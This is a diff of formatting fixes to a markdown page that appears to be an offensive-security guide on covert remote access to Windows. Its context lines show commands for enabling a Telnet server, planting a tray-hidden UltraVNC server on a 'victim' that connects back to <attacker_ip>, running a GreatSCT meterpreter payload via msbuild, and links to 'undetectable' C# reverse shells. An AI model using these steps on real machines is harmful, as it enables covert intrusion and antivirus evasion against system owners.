@@ -2,13 +2,13 @@
 
 ## **Telnet Server**
 
-Until Windows10, all Windows came with a **Telnet server** that you could install (as administrator) doing:
+Until Windows10, all Windows came with a **Telnet server **that you could install (as administrator) doing:
 
 ```
 pkgmgr /iu:"TelnetServer" /quiet
 ```
 
-Make it **start** when the system is started and **run** it now:
+Make it **start **when the system is started and **run **it now:
 
 ```
 sc config TlntSVR start= auto obj= localsystem
@@ -28,14 +28,14 @@ Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.
 **Execute **_**winvnc.exe**_ and configure the server:
 
 * Enable the option _Disable TrayIcon_
-* Set a password in _VNC Password_
+* Set a password in_ VNC Password_
 * Set a password in _View-Only Password_
 
-Then, move the binary _**winvnc.exe**_ and **newly** created file _**UltraVNC.ini**_ inside the **victim**
+Then, move the binary _**winvnc.exe**_ and **newly **created file _**UltraVNC.ini**_ inside the **victim**
 
 ### **Reverse connection**
 
-The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**.\
+The **attacker **should **execute inside **his **host **the binary `vncviewer.exe -listen 5900` so it will be **prepared **to catch a reverse **VNC connection**.\
 Then, it should execute inside the **victim**: `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
 
 ## GreatSCT
@@ -62,7 +62,7 @@ generate #payload is the default name
 #This will generate a meterpreter xml and a rcc file for msfconsole
 ```
 
-Now **start the lister** with `msfconsole -r file.rc` and **execute** the **xml payload** with:
+Now **start the lister** with` msfconsole -r file.rc` and **execute **the **xml payload **with:
 
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
@@ -72,7 +72,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 
 ## Compiling our own reverse shell
 
-&#x20;https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
+ https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
 #### First C# Revershell
 
@@ -160,7 +160,7 @@ namespace ConnectBack
 }
 ```
 
-[https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs](https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs)
+[https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs](https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs)
 
 ## C# using compiler
 
